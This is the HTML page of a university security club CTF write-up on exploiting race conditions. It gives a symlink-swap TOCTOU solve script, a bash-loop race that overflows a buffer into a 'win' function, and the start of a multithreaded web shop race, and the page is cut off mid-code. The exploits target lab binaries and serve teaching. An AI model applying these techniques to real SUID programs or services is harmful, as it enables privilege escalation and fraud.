@@ -1,0 +1,506 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="noodp">
+<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
+<title>Exploiting Race Conditions - CUEH ComSec</title><meta name=Description content="An introduction to exploiting race conditions in software and the web"><meta property="og:title" content="Exploiting Race Conditions">
+<meta property="og:description" content="An introduction to exploiting race conditions in software and the web">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://cov-comsec.github.io/posts/2022_race_conditions/"><meta property="og:image" content="https://cov-comsec.github.io/logo.svg"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2022-02-17T08:40:28+01:00">
+<meta property="article:modified_time" content="2022-02-17T11:34:04+00:00">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://cov-comsec.github.io/logo.svg">
+<meta name=twitter:title content="Exploiting Race Conditions">
+<meta name=twitter:description content="An introduction to exploiting race conditions in software and the web">
+<meta name=application-name content="CUEH ComSec">
+<meta name=apple-mobile-web-app-title content="CUEH ComSec"><meta name=msapplication-TileColor content="#da532c"><link rel=stylesheet href=/css/forms.css media=screen><link rel=icon href=/CUEH.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://cov-comsec.github.io/posts/2022_race_conditions/><link rel=prev href=https://cov-comsec.github.io/posts/2021_twelvetide/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Exploiting Race Conditions","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cov-comsec.github.io\/posts\/2022_race_conditions\/"},"image":["https:\/\/cov-comsec.github.io\/CUEH.svg"],"genre":"posts","keywords":"pwn, web, software_security","wordcount":2217,"url":"https:\/\/cov-comsec.github.io\/posts\/2022_race_conditions\/","datePublished":"2022-02-17T08:40:28+01:00","dateModified":"2022-02-17T11:34:04+00:00","publisher":{"@type":"Organization","name":"Jack Orcherton","logo":"https:\/\/cov-comsec.github.io\/CUEH.svg"},"author":{"@type":"Person","name":"***REMOVED***"},"description":"An introduction to exploiting race conditions in software and the web"}</script></head>
+<body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script>
+<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a>
+</div>
+<div class=menu>
+<div class=menu-inner><a class=menu-item href=/about/> About </a><a class=menu-item href=/posts/> Posts </a><a class=menu-item href=/tags/> Tags </a><a class=menu-item href=/categories/> Categories </a><a class=menu-item href=https://cueh-comsec.ctfd.io/ rel="noopener noreffer" target=_blank> CTFd </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-desktop>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class=mobile id=header-mobile>
+<div class=header-container>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a>
+</div>
+<div class=menu-toggle id=menu-toggle-mobile>
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class=menu id=menu-mobile><div class=search-wrapper>
+<div class="search mobile" id=search-mobile>
+<input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-mobile>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>
+Cancel
+</a>
+</div><a class=menu-item href=/about/ title>About</a><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=https://cueh-comsec.ctfd.io/ title rel="noopener noreffer" target=_blank>CTFd</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id=search-dropdown-desktop></div>
+</div>
+<div class="search-dropdown mobile">
+<div id=search-dropdown-mobile></div>
+</div>
+<main class=main>
+<div class=container><div class=toc id=toc-auto>
+<h2 class=toc-title>Contents</h2>
+<div class=toc-content id=toc-content-auto></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">Exploiting Race Conditions</h1><div class=post-meta>
+<div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>***REMOVED***</a></span>&nbsp;<span class=post-category>included in <a href=/categories/academic-year-2021-22/><i class="far fa-folder fa-fw"></i>Academic Year 2021-22</a></span></div>
+<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-02-17>2022-02-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2217 words&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;11 minutes&nbsp;</div>
+</div><div class="details toc" id=toc-static kept=true>
+<div class="details-summary toc-title">
+<span>Contents</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
+<ul>
+<li><a href=#challenge-0>Challenge 0</a>
+<ul>
+<li><a href=#exploitation>Exploitation</a></li>
+</ul>
+</li>
+<li><a href=#challenge-1>Challenge 1</a>
+<ul>
+<li><a href=#exploitation-1>Exploitation</a>
+<ul>
+<li><a href=#creating-a-filesystem-maze>Creating a filesystem maze</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#challenge-2>Challenge 2</a>
+<ul>
+<li><a href=#exploitation-2>Exploitation</a></li>
+</ul>
+</li>
+</ul>
+</nav></div>
+</div><div class=content id=content><p>During this session we discussed the concept of race conditions in various forms, and how an attacker could exploit them. To recap, as race condition takes advantage of the fact that a system must execute a process in a specific sequence of steps, but due to the nature of modern systems there is an opportunity to alter the environment in which a process in run during this sequence of events. One common form of race condition is a Time-of-Check, Time-of-Use vulnerability (TOCTOU).</p>
+<p>The powerpoint deck used in the session is available <a href=./presentation.pdf rel>here</a></p>
+<h2 id=challenge-0>Challenge 0</h2>
+<p>The first challenge was a simple TOCTOU race condition with very little complexity. The challenge binary was inside a docker container running with SUID privileges and owned by root.</p>
+<p>Once connected over SSH, we can see the binary in the ctf user&rsquo;s home directory. The binary takes a file path as an argument, and will print the contents of any file on the filesystem except the flag.</p>
+<p>In a lot of Linux systems this would be enough for privilege escalation, for example we could attempt to crack the passwords in /etc/shadow or read root ssh keys, but since this is a docker container, and a slightly contrived beginner challenge, root has no password or ssh keys.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss1.png data-srcset="/posts/2022_race_conditions/images/ss1.png, images/ss1.png 1.5x, /posts/2022_race_conditions/images/ss1.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss1.png title="Binary opens /etc/shadow but not /flag"></p>
+<p>So how can we read the flag file? Let&rsquo;s take a closer look at the program. Opening the binary in our decompiler of choice (I&rsquo;m using <a href=https://cutter.re/ target=_blank rel="noopener noreffer">Rizin Cutter</a>) we can see the program run entirely in the <code>main</code> function.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss2.png data-srcset="/posts/2022_race_conditions/images/ss2.png, images/ss2.png 1.5x, /posts/2022_race_conditions/images/ss2.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss2.png title="Decompilation of the main function"></p>
+<p>Let&rsquo;s note down the sequential steps here.</p>
+<ol>
+<li>File path is passed to main via command line argument.</li>
+<li>Introduction text is printed</li>
+<li>Program checks only 1 command argument has been supplied</li>
+<li>Program prints more information text</li>
+<li>lstat is called to get information about the file that was supplied as the argument</li>
+<li>Program prints more information</li>
+<li>Program checks to ensure the supplied file is not a <em>symlink</em></li>
+<li>If it&rsquo;s not a symlink, the file is opened</li>
+<li>Contents of file is written to stdout</li>
+<li><code>main</code> returns.</li>
+</ol>
+<p>For those who don&rsquo;t know, a symlink is short for <em>symbolic link</em>. A common use for symlinks is for file shortcuts. If we had a file at <code>/home/user/example/directory/useful_file.txt</code>, we could avoid having to type the whole path by creating a symlink in <code>/home/example/useful_file.txt</code>. We could also do this with the flag file in the challenge container. You may wonder why I&rsquo;m explaining this, it will come in useful later.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss3.png data-srcset="/posts/2022_race_conditions/images/ss3.png, images/ss3.png 1.5x, /posts/2022_race_conditions/images/ss3.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss3.png title="Symlinking the flag file"></p>
+<p>Full compiler protections are enabled on the binary.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ctf@5496255810ec:~$ checksec --file challenge 
+
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></td></tr></table>
+</div>
+</div><p>So how could this program be exploited? Well, the file information is retrieved at step 5, but the symlink check happens on step 7, and the file is opened at step 8. In between, text is printed to the screen and various other commands are run. Input/Output such as writing to stdout is very slow, and so as an attacker, there is a small window of opportunity where we could change something to trick the program into doing something unintended. This is the Time-of-Check, Time-of-Use.</p>
+<p>Consider this, we create an empty file <code>s</code> and supply it as the argument for the challenge binary. The binary then calls lstat on <code>s</code>, and then uses that information to check its not symlink, but between <code>lstat</code> and when the program calls <code>open</code> on the file, we change <code>s</code> to actually be a symlink to <code>/flag</code>. At Time-of-Check, the supplied file passes all the checks, but at Time-of-Use, the file is a symlink allowing us to read the flag. Obviously this is a tiny window of opportunity, hence why we call it a race condition. We will need to program some automation to change the file state very quickly.</p>
+<h3 id=exploitation>Exploitation</h3>
+<p>There is no single solution to most race conditions, we can use anything that comes to mind in order to increase the window of opportunity (such as using directory mazes), or to speed up the attacker side of the race. In my solution, I fork a Python program, one thread repeatedly runs the program, supplying <code>s</code> as the argument, the other repeatedly switches between <code>s</code> being an empty file and being a symlink to <code>/flag</code>.</p>
+<p>It&rsquo;s worth noting that this script is pretty janky. For example the child process that is swapping the files will continue even after the parent has closed. But for challenge 1 it&rsquo;s enough to get the flag. The solve script is below.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#! /usr/bin/python3</span>
+<span class=kn>import</span> <span class=nn>os</span> 
+<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=k>def</span> <span class=nf>step1</span><span class=p>():</span>
+    <span class=n>os</span><span class=o>.</span><span class=n>unlink</span><span class=p>(</span><span class=s2>&#34;s&#34;</span><span class=p>)</span>
+    <span class=n>os</span><span class=o>.</span><span class=n>close</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;s&#34;</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>O_CREAT</span><span class=p>))</span>
+<span class=k>def</span> <span class=nf>step2</span><span class=p>():</span>
+    <span class=n>os</span><span class=o>.</span><span class=n>unlink</span><span class=p>(</span><span class=s2>&#34;s&#34;</span><span class=p>)</span>
+    <span class=n>os</span><span class=o>.</span><span class=n>symlink</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=s2>&#34;s&#34;</span><span class=p>)</span>
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+
+    <span class=n>attempts</span> <span class=o>=</span> <span class=mi>0</span>
+    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>fork</span><span class=p>()</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+        <span class=n>forkPID</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getpid</span><span class=p>()</span>
+        <span class=n>os</span><span class=o>.</span><span class=n>close</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;s&#34;</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>O_CREAT</span><span class=p>))</span>
+        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+            <span class=n>step1</span><span class=p>()</span>
+            <span class=n>step2</span><span class=p>()</span>
+
+    <span class=k>else</span><span class=p>:</span>
+        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+            <span class=n>attempts</span> <span class=o>+=</span> <span class=mi>1</span> 
+            <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=s2>&#34;challenge&#34;</span><span class=p>,</span> <span class=s2>&#34;s&#34;</span><span class=p>],</span> <span class=n>level</span><span class=o>=</span><span class=s2>&#34;CRITICAL&#34;</span><span class=p>)</span>
+            <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>readall</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+            <span class=k>if</span> <span class=s2>&#34;cueh&#34;</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+                <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
+                <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Took </span><span class=si>{</span><span class=n>attempts</span><span class=si>}</span><span class=s2> attempts&#34;</span><span class=p>)</span>
+                <span class=k>break</span>
+            <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We can see it took 94 attempts before we won the race. We could take additional steps to increase our chance of winning the race, but it was not needed this time.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss4.png data-srcset="/posts/2022_race_conditions/images/ss4.png, images/ss4.png 1.5x, /posts/2022_race_conditions/images/ss4.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss4.png title="Got the first flag"></p>
+<h2 id=challenge-1>Challenge 1</h2>
+<p>The second challenge was a similar setup. We can SSH into a container with a challenge binary. The challenge binary is familiar too, it still accepts a file path as a command line argument. However, this time the program does a size check on the file, if the file is too large it exits.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss5.png data-srcset="/posts/2022_race_conditions/images/ss5.png, images/ss5.png 1.5x, /posts/2022_race_conditions/images/ss5.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss5.png title="Binary will not read large files"></p>
+<p>Let&rsquo;s have a look at the disassembly of this program to see what&rsquo;s going on.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss6.png data-srcset="/posts/2022_race_conditions/images/ss6.png, images/ss6.png 1.5x, /posts/2022_race_conditions/images/ss6.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss6.png title="Disassembly of main"></p>
+<p>We can see the size check ensures the file being read is less than 0x14 (20) bytes large. Additionally, we can see that rather than calling <code>open</code> and then <code>sendfile</code>, the program reads the file data onto the stack before writing it to stdout. This is a key piece of information, as we know that data of a variable size is being read onto the stack.</p>
+<p>We should now find out how large the buffer is. We can do this easily by setting a breakpoint on the read system call, noting where the start of the input buffer, and subtract it from the <code>base pointer + 8</code>. So the offset is <code>0x128</code>, (296) bytes.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss7.png data-srcset="/posts/2022_race_conditions/images/ss7.png, images/ss7.png 1.5x, /posts/2022_race_conditions/images/ss7.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss7.png title="Break on read"></p>
+<p>There are two more pieces to this puzzle, the first is there is a function called <code>win</code> that prints the flag. This simplifies the exploitation process as we can just ret2win rather than having to do a full rop chain.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss8.png data-srcset="/posts/2022_race_conditions/images/ss8.png, images/ss8.png 1.5x, /posts/2022_race_conditions/images/ss8.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss8.png title="Win Function"></p>
+<p>The second is that both PIE and stack canaries have been disabled. This means we could exploit a stack based buffer overflow more easily. Additionally, the lack of PIE means the address of the <code>win</code> function is static, so we do not need to leak any addresses at runtime in order to calculate it&rsquo;s location.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>&gt; checksec --file challenge
+
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=exploitation-1>Exploitation</h3>
+<p>This time I will demonstrate how we could exploit the race condition simply using bash loops. Let&rsquo;s connect over SSH on two terminals, then in one set up a loop to run the program with a file argument, and grep for the flag string. We know the flag starts with <code>cueh</code>.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>while</span> true<span class=p>;</span> <span class=k>do</span> ./challenge test<span class=p>;</span> <span class=k>done</span> <span class=p>|</span> grep -a cueh
+</code></pre></td></tr></table>
+</div>
+</div><p>While this hangs, in another terminal we can craft another bash loop to alter the state of the file <code>test</code>. We know the offset is 296 bytes, so lets enter 296 <code>A</code>s for filler, then the address of the <code>win</code> function. We can find the <code>win</code> function using objdump.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ctf@2fa1db31da25:~$ objdump -x challenge <span class=p>|</span>  grep win
+<span class=m>0000000000401236</span> g     F .text	<span class=m>0000000000000075</span>              win
+</code></pre></td></tr></table>
+</div>
+</div><p>We have everything we need to craft the second loop.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>while</span> <span class=o>(</span><span class=nb>true</span><span class=o>)</span><span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> -ne <span class=s1>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x36\x12\x40\x00\x00\x00\x00\x00\n&#39;</span> &gt; test<span class=p>;</span> <span class=nb>echo</span> <span class=s2>&#34;&#34;</span> &gt; test<span class=p>;</span> <span class=k>done</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This is enough to get the flag.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss9.png data-srcset="/posts/2022_race_conditions/images/ss9.png, images/ss9.png 1.5x, /posts/2022_race_conditions/images/ss9.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss9.png title="Second flag"></p>
+<p>This hit rate (on my system) is pretty low. A flag only comes out every few seconds - let&rsquo;s create a filesystem maze to increase the time it takes the program to locate and open the file <code>test</code>. This is because the kernel has to navigate and validate every directory in the path. This essentially widens the window of opportunity for the attacker to make the malicious change to the file.</p>
+<h4 id=creating-a-filesystem-maze>Creating a filesystem maze</h4>
+<p>A file system maze is essentially a way of forcing a process to pointlessly navigate the filesystem in order to find a file. For example, we could create a directory 800 deep, and then place a file in directory 800 which is a symlink back to the directory we started.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss10.png data-srcset="/posts/2022_race_conditions/images/ss10.png, images/ss10.png 1.5x, /posts/2022_race_conditions/images/ss10.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss10.png title="A maze route"></p>
+<p>This could slow things down a bit, but not a lot. We could create lots of maze paths like the directory above but Linux has a file path limit of 4096 bytes. We can overcome this by making a <em>second</em> symlink that points to the <em>end</em> of the file maze path.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss11.png data-srcset="/posts/2022_race_conditions/images/ss11.png, images/ss11.png 1.5x, /posts/2022_race_conditions/images/ss11.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss11.png title="Symlink to bottom of path"></p>
+<p>This means that instead of needing to provide the full path, we can cover a whole maze path in just a few characters. This allows us to craft large mazes that can really slow the kernel down (within the orders of magnitude required in a race).</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss12.png data-srcset="/posts/2022_race_conditions/images/ss12.png, images/ss12.png 1.5x, /posts/2022_race_conditions/images/ss12.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss12.png title="Symlink to bottom of path"></p>
+<p>This time, when we run the two bash loops we get >10 hits in just a few seconds, significantly increasing our hit rate.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss13.png data-srcset="/posts/2022_race_conditions/images/ss13.png, images/ss13.png 1.5x, /posts/2022_race_conditions/images/ss13.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss13.png title="More Success"></p>
+<h2 id=challenge-2>Challenge 2</h2>
+<p>Challenge two switched context a little. We moved away from the single threaded binary races and into the world of multi-threaded web races.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss14.png data-srcset="/posts/2022_race_conditions/images/ss14.png, images/ss14.png 1.5x, /posts/2022_race_conditions/images/ss14.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss14.png title="Web Application"></p>
+<p>The web application presents a page with some products. A banner shows that we have 1000 bucks. Items in the shop cost different amounts, however the flag costs more money than we currently have. We can buy things that we can afford, and we can also sell them back to the shop.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss15.png data-srcset="/posts/2022_race_conditions/images/ss15.png, images/ss15.png 1.5x, /posts/2022_race_conditions/images/ss15.png 2x" data-sizes=auto alt=/posts/2022_race_conditions/images/ss15.png title="We can buy and sell"></p>
+<p>There actually isn&rsquo;t any vulnerability in the <em>source code</em> of this web application, the vulnerability lies in the implementation. The web application is a multi threaded, using shared resource, without any locking (or similar) methods for the shared resource. Let&rsquo;s have a look at the <code>sell</code> function.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py>    <span class=nd>@db</span><span class=o>.</span><span class=n>connection_context</span><span class=p>()</span>
+    <span class=k>def</span> <span class=nf>sell</span><span class=p>(</span><span class=n>token</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>purchase_id</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=p>(</span><span class=nb>bool</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
+
+        <span class=n>purchase_history_objs</span> <span class=o>=</span> <span class=n>PurchaseLog</span><span class=o>.</span><span class=n>select</span><span class=p>()</span><span class=o>.</span><span class=n>where</span><span class=p>(</span><span class=n>PurchaseLog</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=n>purchase_id</span><span class=p>)</span>
+        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>purchase_history_objs</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span> <span class=k>return</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;Product does not exist&#34;</span>
+
+        <span class=n>purchase_history_obj</span> <span class=o>=</span> <span class=n>purchase_history_objs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+        <span class=n>user_objs</span> <span class=o>=</span> <span class=n>User</span><span class=o>.</span><span class=n>select</span><span class=p>()</span><span class=o>.</span><span class=n>where</span><span class=p>(</span><span class=n>User</span><span class=o>.</span><span class=n>token</span> <span class=o>==</span> <span class=n>token</span><span class=p>)</span>
+
+        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>user_objs</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span> <span class=k>return</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;Invalid User Token&#34;</span>
+
+        <span class=n>user_obj</span> <span class=o>=</span> <span class=n>user_objs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+        <span class=k>if</span> <span class=n>purchase_history_obj</span><span class=o>.</span><span class=n>user_id</span> <span class=o>!=</span> <span class=n>user_obj</span><span class=o>.</span><span class=n>id</span><span class=p>:</span> <span class=k>return</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;You did not make this purchase&#34;</span>
+
+        <span class=c1># We could have a more complex table... or we can just delete the log -_-</span>
+        <span class=n>PurchaseLog</span><span class=o>.</span><span class=n>delete</span><span class=p>()</span><span class=o>.</span><span class=n>where</span><span class=p>(</span><span class=n>PurchaseLog</span><span class=o>.</span><span class=n>id</span> <span class=o>==</span> <span class=n>purchase_history_obj</span><span class=o>.</span><span class=n>id</span><span class=p>)</span><span class=o>.</span><span class=n>execute</span><span class=p>()</span>
+
+        <span class=n>User</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>balance</span><span class=o>=</span><span class=n>user_obj</span><span class=o>.</span><span class=n>balance</span> <span class=o>+</span> <span class=n>purchase_history_obj</span><span class=o>.</span><span class=n>paid_amount</span><span class=p>)</span> \
